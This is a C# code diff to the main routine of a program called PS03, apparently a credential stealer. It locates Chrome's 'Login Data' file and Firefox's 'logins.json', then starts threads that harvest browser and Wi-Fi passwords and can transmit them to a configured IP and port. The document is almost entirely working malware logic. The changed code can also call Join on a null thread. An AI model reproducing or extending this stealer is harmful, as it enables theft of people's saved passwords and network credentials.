@@ -1,6 +1,6 @@
 ﻿using System;
+using System.IO;
 using System.Threading;
-using CommandLine;
 using PS03.CommandLineOptions;
 using PS03.Network.Receive;
 using PS03.PasswordOps;
@@ -13,23 +13,53 @@ namespace PS03
         {
             var options = new Options();
             options.HandleArgs(args);
-          
+
 
             // If the receiver is set, we should not run operations
             if (!options.Receive)
             {
-                var wifi = new GetWifi(options.Ip,options.Port,options.Transmit,options.Verbose);
-                var chrome = new GetChrome(options.Ip, options.Port, options.Transmit, options.Verbose);
-                var firefox = new GetFirefox(options.Ip, options.Port, options.Transmit, options.Verbose);
+                /* Check if files exists */
+                Console.Write("Looking for chrome files...");
+                var chromepath = Path.Combine(Environment.GetEnvironmentVariable("LocalAppData"),
+                    @"Google\Chrome\User Data\Default\Login Data");
+                var chromeexist = File.Exists(chromepath);
+                Console.Write("\t" + chromeexist + "\n");
+
+                Console.Write("Looking for Firefox files...");
+                var fireexists = false;
+                var firepath = Path.Combine(Environment.GetEnvironmentVariable("AppData"), @"Mozilla\Firefox\Profiles");
+                var jsonDirs = Directory.GetDirectories(firepath);
+                foreach (var profile in jsonDirs)
+                {
+                    fireexists = File.Exists(profile + @"\logins.json");
+                    Console.WriteLine("\t" + fireexists + "\n");
+                    break;
+                }
+
+
+                GetChrome chrome;
+                GetFirefox firefox;
+
+                Thread T_FIREFOX = null;
+                Thread T_CHROME = null;
+
+                var wifi = new GetWifi(options.Ip, options.Port, options.Transmit, options.Verbose);
+                if (chromeexist)
+                {
+                    chrome = new GetChrome(options.Ip, options.Port, options.Transmit, options.Verbose);
+                    T_CHROME = new Thread(chrome.Execute);
+                    T_CHROME.Start();
+                }
+
+                if (fireexists)
+                {
+                    firefox = new GetFirefox(options.Ip, options.Port, options.Transmit, options.Verbose);
+                    T_FIREFOX = new Thread(firefox.Execute);
+                    T_FIREFOX.Start();
+                }
 
                 var T_WIFI = new Thread(wifi.Execute);
-                var T_CHROME = new Thread(chrome.Execute);
-                var T_FIREFOX = new Thread(firefox.Execute);
-
-
                 T_WIFI.Start();
-                T_CHROME.Start();
-                T_FIREFOX.Start();
 
                 T_WIFI.Join();
                 T_CHROME.Join();
